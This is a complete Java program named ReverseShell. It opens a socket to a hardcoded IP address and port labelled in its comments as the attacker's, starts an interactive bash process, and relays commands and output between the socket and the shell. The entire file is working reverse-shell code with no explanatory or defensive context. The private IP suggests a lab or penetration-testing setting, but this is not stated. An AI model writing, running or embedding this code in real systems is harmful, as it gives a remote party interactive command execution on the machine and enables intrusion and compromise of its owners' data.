import java.io.*;
import java.net.*;

public class ReverseShell {
    public static void main(String[] args) {
        String host = "192.168.29.146";  // attacker IP
        int port = 4444;                 // attacker port
        try {
            Socket socket = new Socket(host, port);
            Process process = Runtime.getRuntime().exec("/bin/bash -i");
            InputStream processInput = process.getInputStream();
            OutputStream processOutput = process.getOutputStream();

            // send bash output -> socket
            new Thread(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = processInput.read(buffer)) != -1) {
                        socket.getOutputStream().write(buffer, 0, bytesRead);
                        socket.getOutputStream().flush();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }).start();

            // read from socket -> bash stdin
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                processOutput.write((line + "\n").getBytes());
                processOutput.flush();
            }

            socket.close();
            process.destroy();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
